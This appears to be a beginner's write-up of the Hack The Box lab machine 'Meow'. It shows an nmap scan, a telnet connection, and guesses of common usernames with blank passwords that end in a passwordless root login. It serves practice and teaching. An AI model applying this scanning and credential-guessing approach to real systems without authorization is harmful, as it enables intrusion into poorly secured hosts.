### Tools
* Nmap

### Recon
First thing I'm going to do is run an **nmap** scan of the machine. 

```
└─$ nmap -sC -sV -oA meow 10.129.45.206
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-25 23:35 EST
Nmap scan report for 10.129.45.206
Host is up (0.052s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
* `Port 23` is open and is running a **telnet** service.

We can try to connect to this telnet port. 

*If you don't have telnet on your VM (virtual machine). I'm using Kali Linux in VirtualBox. The command to install it is: `apt-get install telnet` if this doesn't work then add `sudo` like so: `sudo apt-get install telnet`. `sudo` (superuser do) allows you to run some commands as the root user.*

```
└─$ telnet 10.129.45.206
Trying 10.129.45.206...
Connected to 10.129.45.206.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█

Meow login: 
Password: 
```
We are presented with a login screen. However, so far we don't know what the username/password could be. We need to find some credentials so we can attempt to login. 

### Foothold
Since this machine is considered 'Very Easy'. We'll assume the login credentials would be something easy and predictable. 

Some predictable usernames that are important: 
* admin
* administrator
* root 

As for the password, let's assume there is none because sometimes they are left blank or super easy ones such as `password`, `password123`, or even `12345678`. 

Let's test these usernames out first with no password!
```
Meow login: admin
Password: 

Login incorrect
Meow login: administrator
Password: 

Login incorrect
Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 26 Feb 2022 05:05:33 AM UTC
```
Well would ya look at that! We are able to login as the root user without a password! 

We can confirm that we are indeed the root user: 
```
root@Meow:~# whoami
root  
```

And when we check the current directory, the `flag.txt` is the first thing we see: 
```
root@Meow:~# ls                                                                             
flag.txt  snap 
```
Then we can run the `cat flag.txt` command to reveal the flag! We're done!

### Summary
I know that this is a super short and easy machine on Hack The Box, but it's still learning and practice experience. It's great for getting used to using **Nmap** and exploiting **telnet**. The issue with this telnet login is account misconfiguration. Where an important user, `root` in this case, doesn't have a password setup allowing attackers a super easy way into a system. This machine doesn't go in-depth on how to exploit telnet services, but least we're able to try logging in and understand that we can use predictable login credentials to brute-force our way in. Next time, if we run into another situation similar to this we can try doing this and if it doesn't work we can rule it out and try other methods.

Tags: Linux | Network | Account Misconfiguration
